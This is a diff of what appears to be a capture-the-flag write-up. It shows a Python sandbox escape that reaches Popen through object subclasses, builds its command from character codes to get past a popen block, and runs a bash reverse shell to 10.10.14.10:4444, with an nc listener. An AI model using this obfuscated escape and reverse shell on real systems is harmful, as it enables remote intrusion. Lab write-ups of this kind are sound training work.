@@ -8,8 +8,6 @@ popen was blocked
 
 RevShells basic format: bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'  
 
-nc -lvnp 4444  
-
 x = ().__class__.__bases__[0].__subclasses__()
 e = [c for c in x if c.__name__ == ''.join([chr(i) for i in [80,111,112,101,110]])][0]
 cmd = ''.join([chr(i) for i in [
@@ -19,7 +17,10 @@ cmd = ''.join([chr(i) for i in [
 ]])  # bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'
 e(['/bin/bash', '-c', cmd], shell=False) 
 
-RevShell/Foothold  
+RevShell/Foothold
+
+Command: nc -lvnp 4444 
+
 ![revshell](./images/revshell.png)  
 
 ![userflag](./images/userflag.png)  
